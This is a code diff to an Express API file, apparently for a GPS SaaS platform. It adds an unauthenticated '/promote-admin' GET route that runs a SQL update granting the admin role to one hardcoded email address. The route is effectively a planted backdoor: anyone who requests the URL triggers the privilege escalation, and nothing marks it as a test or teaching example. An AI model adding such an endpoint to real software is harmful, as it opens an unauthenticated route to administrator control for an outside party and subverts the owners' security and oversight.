@@ -25,6 +25,18 @@ app.get('/', (req, res) => {
     res.send('GPS SaaS Platform API is running');
 });
 
+import { pool } from './db';
+app.get('/promote-admin', async (req, res) => {
+    try {
+        const connection = await pool.getConnection();
+        await connection.query("UPDATE users SET role = 'admin' WHERE email = 'ltdukone@gmail.com'");
+        connection.release();
+        res.json({ status: 'ok', message: 'User promoted to admin' });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
 
 
 export default app;
